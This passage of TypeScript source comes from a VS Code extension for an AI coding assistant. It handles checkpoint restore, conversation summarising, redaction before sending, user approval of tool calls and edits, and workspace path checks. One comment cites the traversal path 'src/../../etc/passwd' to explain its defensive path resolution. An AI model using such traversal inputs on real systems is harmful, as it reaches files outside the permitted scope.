      partial: t("Some changes were too large to record and will NOT be undone."),
    });
    const go = t("Restore");
    const answer = await vscode.window.showWarningMessage(
      t("Go back to before “{0}”?", entry.text.trim().split("\n")[0]!.slice(0, 60)),
      { modal: true, detail: `${detail}\n\n${t("Anything you changed by hand in those files since is overwritten. Ctrl+Z undoes this.")}` },
      go,
    );
    if (answer !== go) return;

    const edit = new vscode.WorkspaceEdit();
    for (const snap of entry.checkpoint) {
      const uri = vscode.Uri.joinPath(folder.uri, snap.path);
      if (snap.before === undefined) {
        // The turn created it, so going back means it is not there. `ignoreIfNotExists` covers the
        // file having already been deleted by hand, which must not fail the whole restore.
        edit.deleteFile(uri, { ignoreIfNotExists: true });
      } else {
        const doc = await vscode.workspace.openTextDocument(uri).then(
          (d) => d,
          () => undefined,
        );
        if (doc) {
          edit.replace(uri, new vscode.Range(0, 0, doc.lineCount, 0), snap.before);
        } else {
          // Deleted since. Recreating it is still "back to how it was".
          edit.createFile(uri, { overwrite: true, contents: new TextEncoder().encode(snap.before) });
        }
      }
    }

    if (!(await vscode.workspace.applyEdit(edit))) {
      void vscode.window.showErrorMessage(t("The files could not be restored; the conversation is unchanged."));
      return;
    }

    const restoredFiles = entry.checkpoint.length;
    // The question comes back to the composer. Restoring is a rewind, not a deletion: the thing you
    // most often want next is the same question, asked differently.
    const text = this.session.rewindTo(id);
    this.screen = "chat";
    this.persist();
    this.sendState();
    if (text) this.post({ type: "restoreDraft", text });
    this.post({ type: "status", text: t("{0} file(s) restored. The conversation is back to that point.", restoredFiles) });
  }

  private async shareSkills(): Promise<void> {
    const found = await this.definitions.load();
    if (!found.skills.length) {
      const create = t("Create a skill");
      const answer = await vscode.window.showInformationMessage(
        t("This repository defines no skills yet."),
        { modal: false, detail: t("A skill is a Markdown file in .hiveycode/skills/. Committing it is how it reaches your team.") },
        create,
      );
      if (answer === create) await vscode.commands.executeCommand("hiveyCode.newSkill");
      return;
    }

    const reveal = t("Show the folder");
    const copy = t("Copy them as Markdown");
    const answer = await vscode.window.showInformationMessage(
      t("{0} skill(s) in .hiveycode/skills/.", found.skills.length),
      { modal: false, detail: t("They travel with the repository: commit the folder and your team has them. To send them to somebody outside it, copy them.") },
      reveal,
      copy,
    );

    const folder = vscode.workspace.workspaceFolders?.[0];
    if (answer === reveal && folder) {
      await vscode.commands.executeCommand("revealInExplorer", vscode.Uri.joinPath(folder.uri, ".hiveycode", "skills"));
      return;
    }
    if (answer === copy) {
      // Each file reproduced whole, frontmatter included, under a heading naming its path. Anyone
      // receiving this can put the files back exactly where they came from — which is the only
      // thing a paste-able format has to get right.
      const doc = found.skills
        .map((sk) => `<!-- ${sk.source} -->\n\n${sk.body.trim()}\n`)
        .join("\n---\n\n");
      await vscode.env.clipboard.writeText(doc);
      void vscode.window.showInformationMessage(t("{0} skill(s) copied. Paste them into .hiveycode/skills/ on the other side.", found.skills.length));
    }
  }

  private async compact(): Promise<void> {
    const settings = readSettings();
    const covered = this.session.entries.filter((e) => e.included && !e.error && e.text.trim());
    if (covered.length < 2) {
      void vscode.window.showInformationMessage(t("There is not enough conversation to summarise yet."));
      return;
    }

    this.screen = "chat";
    this.turn?.abort();
    const ctl = new AbortController();
    this.turn = ctl;
    this.post({ type: "turnStart" });
    this.post({ type: "status", text: t("Summarising the conversation…") });

    const providerId = settings.chat.provider;
    const model = settings.chat.model;
    const baseUrl = safeUrl(settings, providerId);
    const isLocal = isLocalEndpoint(baseUrl);
    const vault = new Vault();

    try {
      const provider = await providerFor(settings, this.keys, providerId);
      const transcript = digestEntries(covered, {
        you: t("You"),
        assistant: "Hivey Code",
        // Most of the window, since the summary is the point of the request rather than a
        // side-effect of it. What does not fit is the oldest material, which is what a summary
        // written under pressure would have compressed hardest anyway.
        maxTokens: Math.floor(settings.context.maxTokens * 0.8),
        omittedNote: (n) => t("({0} earlier exchanges omitted.)", n),
      });

      const messages = [
        { role: "system" as const, content: compactBrief(), cacheable: true },
        { role: "user" as const, content: transcript },
      ];
      const prepared = await this.gate.prepare(messages, settings, { provider: providerId, model, baseUrl, isLocal }, vault);
      if (!prepared) {
        this.post({ type: "status", text: t("Request cancelled.") });
        return;
      }

      let streamed = "";
      const result = await runTurn({
        provider,
        model,
        messages: prepared.messages,
        signal: ctl.signal,
        maxTokens: 2048,
        temperature: 0.2,
        onDelta: (d) => {
          if (!d.text) return;
          streamed += d.text;
          this.post({ type: "delta", text: vault.restore(d.text) });
        },
        afterResponse: (text) => vault.restore(text),
      });

      const summary = (result.text || streamed).trim();
      if (!summary) {
        this.post({ type: "error", message: t("The summary came back empty; nothing was changed.") });
        return;
      }

      // Mute FIRST, add SECOND. The other order mutes the summary along with everything else,
      // because at that point it is one of the entries the loop is walking.
      const ids = new Set(covered.map((e) => e.id));
      for (const entry of this.session.entries) if (ids.has(entry.id)) entry.included = false;
      // Pinned, because the whole point is that it survives the trimming that would otherwise drop
      // it first — it is the oldest entry the moment the next question is asked.
      this.session.add({
        role: "assistant",
        text: `${t("**Summary of the conversation so far**")}\n\n${summary}`,
        model,
        pinned: true,
      });

      if (!isLocal) {
        const cost = costOf(result.usage, this.priceLookup(model));
        this.gate.record(
          {
            at: Date.now(),
            provider: providerId,
            host: safeHost(baseUrl),
            model,
            promptTokens: result.usage.promptTokens,
            completionTokens: result.usage.completionTokens,
            cachedTokens: result.usage.cachedTokens,
            usd: cost.usd,
            redactions: prepared.findings.length,
            redactionSummary: vault.summary().map((x) => `${x.label}\u00d7${x.count}`).join(", "),
          },
          settings,
        );
      }
      // The gain, measured rather than asserted. "Compacted" tells the user an operation ran;
      // "8 200 → 900 tokens" tells them whether it was worth running, which is the only thing they
      // can act on — and it is the number this feature exists to move.
      const before = covered.reduce(
        (sum, e) => sum + estimateTokens(e.text) + (e.context ?? []).reduce((a, c) => a + estimateTokens(c.body), 0),
        0,
      );
      const after = estimateTokens(summary);
      this.post({
        type: "status",
        text: t(
          "{0} exchanges summarised: {1} → {2} tokens. Everything stays on screen.",
          covered.length,
          before,
          after,
        ),
      });
      this.persist();
    } catch (err) {
      const message = (err as Error).message;
      this.post({ type: "error", message });
      this.log.appendLine(`[compact] ${message}`);
    } finally {
      this.turn = undefined;
      this.post({ type: "turnEnd" });
      this.sendState();
    }
  }

  private async ask(text: string): Promise<void> {
    if (!text.trim()) return;
    this.screen = "chat";

    // `#context` and `@participant` are resolved here, on this machine, before anything is built
    // and long before anything is sent. The mentions stay in the text the user sees — removing
    // them would make the transcript read as though they had never asked.
    const parsed = parsePrompt(text);
    this.participant = parsed.participant;
    const settings = readSettings();
    const resolved = parsed.mentions.length
      ? await resolveMentions(parsed.mentions, {
          workspace: this.workspace,
          settings,
          repoMap: () => this.workspace.repoMap(Math.floor(settings.context.maxTokens * 0.4)),
        })
      : [];
    // The file on screen, unless the user waved it away or has already attached it by hand. It goes
    // FIRST, because it is what the question is most likely about, and because a model reads the
    // beginning of a long prompt more reliably than the middle.
    const implicit = this.workspace.activeContext(3000, settings);
    const useImplicit =
      implicit &&
      this.implicitDismissed !== implicit.label &&
      !this.attachments.some((a) => a.label === implicit.label) &&
      !resolved.some((a) => a.label === implicit.label);
    const context = [...(useImplicit ? [implicit] : []), ...this.attachments, ...resolved];

    // The guided start ends here, whatever step it was on: the user has asked their question, which
    // is the thing it existed to lead up to.
    this.wizard = undefined;
    this.session.add({ role: "user", text, context: context.length ? context : undefined });
    this.attachments = [];
    this.sendState();
    await this.runTurn();
  }

  /** The participant of the turn being asked, if the user named one. Reset by the next question. */
  private participant: Participant | undefined;

  // ── The turn ───────────────────────────────────────────────────────────────────────────────

  private async runTurn(): Promise<void> {
    const settings = readSettings();
    const mode = this.session.mode;
    // Every file this turn is about to change gets snapshotted against the question that asked for
    // it. Set here rather than passed down: `confirmEdit` sits several layers of tool machinery
    // away, and threading an id through all of them would put a checkpoint concern in files that
    // have nothing to do with checkpoints.
    this.checkpointFor = [...this.session.entries].reverse().find((e) => e.role === "user")?.id;
    this.plan = undefined;
    this.turn?.abort();
    const ctl = new AbortController();
    this.turn = ctl;
    this.post({ type: "turnStart" });

    const nonce = randomNonce();
    // Chat mode answers from what it was given: no repository map, no tools, no surprises.
    // The repository's own rules, if it has any. They sit in the cacheable prefix, which is where
    // text that is identical on every turn belongs.
    const houseRules = await instructionsPrompt();
    const ambient =
      mode !== "chat" && settings.context.repoMap
        ? await this.workspace.repoMap(Math.floor(settings.context.maxTokens * 0.4))
        : undefined;
    const allTools: Tool[] = buildTools({
      settings: () => settings,
      confirmEdit: (u, n) => this.confirmEdit(u, n),
      // The plan goes to the panel as it is written and onto the answer when the turn ends, so it
      // is both a live progress display and part of the record.
      onPlan: (plan) => {
        this.plan = plan;
        this.post({ type: "plan", plan });
      },
      arcad: { credentials: () => this.keys.arcad() },
      mcp: this.mcp,
    });
    const tools = toolsForMode(allTools, mode);

    // What the repository defines. Read fresh: a skill you have to reload the window to try is a
    // skill nobody iterates on.
    const definitions = await this.definitions.load();
    if (definitions.problems.length) this.reportDefinitionProblems(definitions.problems);
    // Not in chat mode. A skill is instructions the user wrote, but it is still a file read from
    // the repository, and chat mode's promise is that it does not read the repository. A promise
    // with an exception in it is not one.
    if (mode !== "chat") {
      tools.push(
        ...buildDefinitionTools(
          {
            store: this.definitions,
            availableTools: () => tools.map((tool) => tool.schema.name),
            runSubAgent: (run) =>
              this.runSubAgent(run, { settings, providerId, model, baseUrl, isLocal, vault, allTools, mode }),
          },
          {
            ...definitions,
            // A switched-off skill or sub-agent is not described to the model either. Filtering it
            // out of the picker alone would leave the model announcing a delegation it cannot make.
            skills: definitions.skills.filter((sk) => isSkillEnabled(skillInvocation(sk.name), settings.skills.disabled)),
            agents: definitions.agents.filter((a) => !settings.agents.disabled.includes(a.name)),
          },
        ),
      );
    }

    const built = this.session.build({
      systemPrompt:
        promptForMode(mode) +
        workspaceNote() +
        dialectNote() +
        houseRules +
        (mode === "chat"
          ? ""
          : skillsPrompt(
              // A switched-off skill is not described to the model either. Filtering it out of the
              // `/` list alone would leave the model announcing a skill the user cannot invoke.
              definitions.skills.filter((sk) => isSkillEnabled(skillInvocation(sk.name), settings.skills.disabled)),
            )) +
        (this.participant ? `\n\n${participantDirective(this.participant)}` : ""),
      ambient: ambient ? `${ambient.text}\n\n(${ambient.files} files mapped, ${ambient.omitted} omitted)` : undefined,
      maxTokens: settings.context.maxTokens,
      nonce,
    });

    const lastUser = [...this.session.entries].reverse().find((e) => e.role === "user");
    const decision = route(routerConfig(settings), {
      kind: mode === "chat" ? "chat" : "agent",
      prompt: lastUser?.text ?? "",
      promptTokens: built.estimatedTokens,
    });
    let providerId = decision.provider;
    let model = decision.model;
    if (decision.suggestEscalation) {
      const choice = await vscode.window.showInformationMessage(
        t(
          "This question is beyond the local model ({0}). Send it to {1}?",
          decision.suggestEscalation.why,
          decision.suggestEscalation.model,
        ),
        t("Send"),
        t("Stay local"),
      );
      if (choice === t("Send")) {
        providerId = decision.suggestEscalation.provider;
        model = decision.suggestEscalation.model;
      }
    }

    const baseUrl = safeUrl(settings, providerId);
    const isLocal = isLocalEndpoint(baseUrl);
    const vault = new Vault();
    const steps: Array<{ tool: string; summary: string; ok: boolean }> = [];

    // What this question will send, said before it is sent.
    //
    // It existed once as a modal dialog, was removed for being invasive, and is back as a card in
    // the conversation — which is where it belonged: it is a fact about the message being sent, and
    // the message is on that screen. "Always" switches it off for good, so anyone who does not want
    // it pays for it once. Nothing about it is a privacy control; the egress gate is separate and
    // untouched by the answer given here.
    if (settings.privacy.confirmSend !== "never") {
      const price = this.priceLookup(model);
      const cost = isLocal ? 0 : estimateCost(built.estimatedTokens, price);
      const detail = [
        t("~{0} tokens", built.estimatedTokens),
        isLocal ? t("on this machine, nothing billed") : t("~{0} $ on {1}", cost.toFixed(4), safeHost(baseUrl)),
      ];
      const answer = await new Promise<"once" | "session" | "always" | "no">((resolve) => {
        const id = randomNonce();
        this.approvals.set(id, resolve);
        this.post({
          type: "approval",
          id,
          tool: "send",
          description: t("Send this question to {0}?", model),
          choices: ["once", "always", "no"],
          detail,
        });
      });
      if (answer === "no") {
        this.post({ type: "status", text: t("Not sent.") });
        this.post({ type: "turnEnd" });
        return;
      }
      if (answer === "always") {
        await vscode.workspace
          .getConfiguration(SECTION)
          .update("privacy.confirmSend", "never", vscode.ConfigurationTarget.Global);
      }
    }

    try {
      const provider = await providerFor(settings, this.keys, providerId);

      const prepared = await this.gate.prepare(built.messages, settings, { provider: providerId, model, baseUrl, isLocal }, vault);
      if (!prepared) {
        this.post({ type: "status", text: t("Request cancelled.") });
        this.post({ type: "turnEnd" });
        return;
      }

      if (!isLocal) {
        const estimate = estimateCost(prepared.estimatedTokens, this.priceLookup(model));
        const verdict = this.gate.budget.check(estimate);
        if (!verdict.ok) {
          this.post({
            type: "error",
            message: t("Budget: {0}. Adjust hiveyCode.budget or stay local.", verdict.message),
          });
          this.post({ type: "turnEnd" });
          return;
        }
      }

      const answer = this.session.add({ role: "assistant", text: "", model });
      let streamed = "";
      let thought = "";

      const result = await runTurn({
        provider,
        model,
        messages: prepared.messages,
        tools,
        signal: ctl.signal,
        maxTokens: 4096,
        reasoning: this.reasoning,
        onDelta: (d) => {
          if (d.text) {
            streamed += d.text;
            // Placeholders are resolved as they stream, so the user never reads their own data
            // through a marker.
            this.post({ type: "delta", text: vault.restore(d.text) });
          }
          if (d.reasoning) {
            thought += d.reasoning;
            this.post({ type: "reasoning", text: vault.restore(d.reasoning) });
          }
        },
        onToolResult: ({ call, result }) => {
          const summary = String(result.content).split("\n")[0]?.slice(0, 120) ?? "";
          steps.push({ tool: call.name, summary, ok: !result.isError });
          this.post({ type: "status", text: summary, tool: call.name, ok: !result.isError });
        },
        report: (msg) => this.post({ type: "status", text: msg }),
        approve: (req) => this.askApproval(req),
        // Redaction runs on EVERY step, because a tool result is new text that never went through
        // the gate — a file the agent just read can contain the credential the first prompt did not.
        //
        // A refusal here must ABORT the turn. Falling back to the original messages would send the
        // unredacted text precisely when the user said no.
        beforeRequest: async (messages) => {
          if (isLocal) return messages;
          const again = await this.gate.prepare(messages, settings, { provider: providerId, model, baseUrl, isLocal }, vault);
          if (!again) throw new Error(t("Request refused: the rest of the turn was not sent."));
          return again.messages;
        },
        afterResponse: (t) => vault.restore(t),
      });

      answer.text = result.text || streamed;
      if (this.plan) answer.plan = this.plan;
      answer.usdCost = 0;
      if (thought) answer.reasoning = thought;
      if (steps.length) answer.steps = steps;

      if (!isLocal) {
        const cost = costOf(result.usage, this.priceLookup(model));
        answer.usdCost = cost.usd;
        this.gate.record(
          {
            at: Date.now(),
            provider: providerId,
            host: safeHost(baseUrl),
            model,
            promptTokens: result.usage.promptTokens,
            completionTokens: result.usage.completionTokens,
            cachedTokens: result.usage.cachedTokens,
            usd: cost.usd,
            redactions: prepared.findings.length,
            redactionSummary: vault.summary().map((x) => `${x.label}×${x.count}`).join(", "),
          },
          settings,
        );
      }

      if (result.stoppedBecause === "max-steps") {
        this.post({ type: "status", text: t("Stopped after the maximum number of steps.") });
      }
      this.persist();
    } catch (err) {
      const message = (err as Error).message;
      const last = this.session.entries[this.session.entries.length - 1];
      if (last?.role === "assistant" && !last.text) last.error = message;
      this.post({ type: "error", message });
      this.log.appendLine(`[turn] ${message}`);
    } finally {
      this.turn = undefined;
      this.checkpointFor = undefined;
      // Old checkpoints give up their file contents here rather than at write time: the cap is
      // about what is STORED, and this is the moment just before the conversation is stored.
      this.session.entries = trimCheckpoints(this.session.entries);
      this.persist();
      this.post({ type: "turnEnd" });
      this.sendState();
    }
  }

  /**
   * Ask, unless the permission book already answered. The book is consulted BEFORE the panel is
   * disturbed, which is what makes "toujours autoriser" worth anything.
   */
  /** Consent to send, asked as a card in the conversation. */
  private askEgress(request: { description: string; detail: string[] }): Promise<"once" | "always" | "no"> {
    if (!this.view) return Promise.resolve("no");
    const id = randomNonce();
    this.post({
      type: "approval",
      id,
      tool: "egress",
      description: request.description,
      detail: request.detail,
      // No "this session": consent to a destination is per destination, and a session is not one.
      choices: ["once", "always", "no"],
    });
    return new Promise((resolve) => {
      this.approvals.set(id, (answer) => resolve(answer === "no" ? "no" : answer === "always" ? "always" : "once"));
      this.turn?.signal.addEventListener("abort", () => {
        if (this.approvals.delete(id)) resolve("no");
      });
    });
  }

  private askApproval(req: { tool: string; description: string; args: Record<string, unknown> }): Promise<boolean> {
    const decision = this.permissions.decide(req.tool, req.args);

    // A standing refusal comes first and is checked below; a standing ALLOWANCE and the scope
    // policy are equivalent in effect, so either may satisfy the request. What may never happen is
    // a scope turning a refusal into a permission, which is why this sits after `decide` rather
    // than before it.
    if (decision !== "never") {
      const settings = readSettings();
      const path = pathArgument(req.args);
      const auto = autoApprove(
        {
          scope: settings.permissions.autoApprove,
          allowedPaths: settings.permissions.allowedPaths,
          allowedCommands: settings.permissions.allowedCommands,
          deniedPaths: settings.permissions.deniedPaths,
          deniedCommands: settings.permissions.deniedCommands,
          // The privacy list is passed in rather than duplicated: one list, one place to change it.
          blockedGlobs: settings.privacy.blockedGlobs,
        },
        {
          tool: req.tool,
          ...(path ? { path, insidePath: isInsideWorkspace(path) } : {}),
          ...(req.tool === "run_command" ? { command: String(req.args["command"] ?? "") } : {}),
        },
        matchGlob,
      );
      if (auto.allow) {
        this.post({ type: "status", text: t("{0} — {1}", req.description, auto.because), tool: req.tool, ok: true });
        return Promise.resolve(true);
      }
    }

    if (decision === "always" || decision === "session") {
      this.post({ type: "status", text: t("{0} — allowed by a rule", req.description), tool: req.tool, ok: true });
      return Promise.resolve(true);
    }
    if (decision === "never") {
      this.post({ type: "status", text: t("{0} — refused by a rule", req.description), tool: req.tool, ok: false });
      return Promise.resolve(false);
    }

    const id = randomNonce();
    const command = req.tool === "run_command" ? String(req.args["command"] ?? "") : undefined;
    this.post({ type: "approval", id, tool: req.tool, description: req.description, ...(command ? { command } : {}) });
    return new Promise<boolean>((resolve) => {
      this.approvals.set(id, (answer) => {
        if (answer === "session" || answer === "always") {
          this.permissions.remember(req.tool, req.args, answer);
          this.sendState();
        }
        resolve(answer !== "no");
      });
      // A turn that is cancelled must not leave a promise hanging forever.
      this.turn?.signal.addEventListener("abort", () => {
        if (this.approvals.delete(id)) resolve(false);
      });
    });
  }

  /** Show the change as a diff before it is applied — the reviewable-edit rule. */
  /**
   * The question the current turn belongs to.
   *
   * Set when a turn starts and cleared when it ends, so `confirmEdit` — which is several layers of
   * tool machinery away — knows which entry a snapshot belongs to without every layer between
   * having to carry it.
   */
  private checkpointFor: string | undefined;

  /** The plan the current turn is keeping, if it started one. Reset at the top of every turn. */
  private plan: Plan | undefined;

  /**
   * Take a file's prior state, once per turn.
   *
   * Called from `confirmEdit` only after the user has said Apply, which is the right moment twice
   * over: the content read there is the state immediately before the change, and a refused edit
   * leaves nothing to roll back.
   */
  private snapshot(uri: vscode.Uri, before: string | undefined): void {
    if (!this.checkpointFor) return;
    const entry = this.session.get(this.checkpointFor);
    if (!entry) return;
    entry.checkpoint ??= [];
    const result = capture(entry.checkpoint, relative(uri), before);
    if (result.kind === "captured") entry.checkpoint.push(result.snapshot);
    // A file too large to hold, or a turn that changed more than a checkpoint can carry. Recorded
    // rather than hidden: restoring would then put the repository into a state it was never in, and
    // the user has to be told before they press the button, not after.
    else if (result.kind !== "already") entry.checkpointPartial = true;
  }

  private async confirmEdit(uri: vscode.Uri, next: string): Promise<boolean> {
    const original = await readOrEmpty(uri);
    const preview = uri.with({ scheme: "hivey-code-preview", query: Date.now().toString() });
    previewContents.set(preview.toString(), next);
    await vscode.commands.executeCommand(
      "vscode.diff",
      original === undefined ? vscode.Uri.parse("untitled:nouveau") : uri,
      preview,
      t("{0} — proposed by Hivey Code", relative(uri)),
      { preview: true },
    );
    const answer = await vscode.window.showInformationMessage(
      t("Apply the change to {0}?", relative(uri)),
      { modal: false },
      t("Apply"),
      t("Refuse"),
    );
    previewContents.delete(preview.toString());
    const apply = answer === t("Apply");
    if (apply) this.snapshot(uri, original);
    return apply;
  }
}

/** Backing store for the diff preview documents. */
export const previewContents = new Map<string, string>();

export class PreviewProvider implements vscode.TextDocumentContentProvider {
  provideTextDocumentContent(uri: vscode.Uri): string {
    return previewContents.get(uri.toString()) ?? "";
  }
}

function workspaceNote(): string {
  const folder = vscode.workspace.workspaceFolders?.[0];
  return folder ? `\n\nWorkspace: ${folder.name}.` : "";
}

/**
 * The rules of the dialect in the active editor, when that dialect has rules a model gets wrong.
 *
 * Only IBM i qualifies today, and it qualifies badly: a model that writes free-form RPG into a
 * fixed-format member produces something that looks right, compiles into something else, and fails
 * in a spool file. The text is appended to the SYSTEM prompt rather than to the turn, which sounds
 * like it would break the prompt cache on every file switch — it does not, because the text depends
 * on the dialect and not on the file. A conversation about RPG keeps the same prefix throughout.
 */
function dialectNote(): string {
  const doc = vscode.window.activeTextEditor?.document;
  if (!doc) return "";
  const lang = detectIbmiLanguage(doc.uri.path, doc.getText().slice(0, 20_000));
  return lang ? `\n\n${ibmiPrompt(lang)}` : "";
}

function safeUrl(s: Settings, id: Settings["chat"]["provider"]): string {
  try {
    return endpointFor(s, id);
  } catch {
    return "";
  }
}

async function readOrEmpty(uri: vscode.Uri): Promise<string | undefined> {
  try {
    return new TextDecoder().decode(await vscode.workspace.fs.readFile(uri));
  } catch {
    return undefined;
  }
}

function estimateCost(promptTokens: number, price: Price | undefined): number {
  if (!price) return 0;
  // Assume an answer about a quarter the size of the question: enough to catch a runaway prompt,
  // not so pessimistic that the cap fires on ordinary turns.
  return (promptTokens * price.in + promptTokens * 0.25 * price.out) / 1_000_000;
}

function randomNonce(): string {
  const bytes = new Uint8Array(16);
  // The webview CSP nonce and the untrusted-content fence both depend on this being unguessable.
  (globalThis.crypto ?? require("node:crypto").webcrypto).getRandomValues(bytes);
  return [...bytes].map((b) => b.toString(16).padStart(2, "0")).join("");
}

export { commandPrefix };

/**
 * The path a tool call is about, if it is about one.
 *
 * Tools name it differently — `path` for a file, `member` for an IBM i source member — and a policy
 * about paths that only understood one of those spellings would be a policy with a hole in it.
 */
function pathArgument(args: Record<string, unknown>): string | undefined {
  for (const key of ["path", "file", "member", "uri"]) {
    const value = args[key];
    if (typeof value === "string" && value.trim()) return value.trim();
  }
  return undefined;
}

/**
 * Whether a path resolves inside the open folder.
 *
 * Resolved against the real root rather than matched as text: `src/../../etc/passwd` is a relative
 * path that reads as being inside the workspace and is not. A textual check is exactly the check
 * this has to not be.
 */
function isInsideWorkspace(path: string): boolean {
  const folder = vscode.workspace.workspaceFolders?.[0];
  if (!folder) return false;
  const root = folder.uri.fsPath.replace(/\\/g, "/").replace(/\/+$/, "");
  const absolute = /^([a-zA-Z]:)?[/\\]/.test(path)
    ? path.replace(/\\/g, "/")
    : `${root}/${path.replace(/\\/g, "/")}`;
  const resolved = normalise(absolute);
  return resolved === root || resolved.startsWith(`${root}/`);
}

/** Collapse `.` and `..` without touching the filesystem — the path may not exist yet. */
function normalise(path: string): string {
  const out: string[] = [];
  for (const part of path.split("/")) {
    if (!part || part === ".") continue;
    if (part === "..") out.pop();
    else out.push(part);
  }
  return (path.startsWith("/") ? "/" : "") + out.join("/");
}

/** What the editor is showing, for the context menu's labels. */
function activeEditor(): UiActiveEditor | undefined {
  const editor = vscode.window.activeTextEditor;
  if (!editor) return undefined;
  const selection = editor.selection;
  return {
    path: relative(editor.document.uri),
    hasSelection: !selection.isEmpty,
    selectedLines: selection.isEmpty ? 0 : selection.end.line - selection.start.line + 1,
  };
}
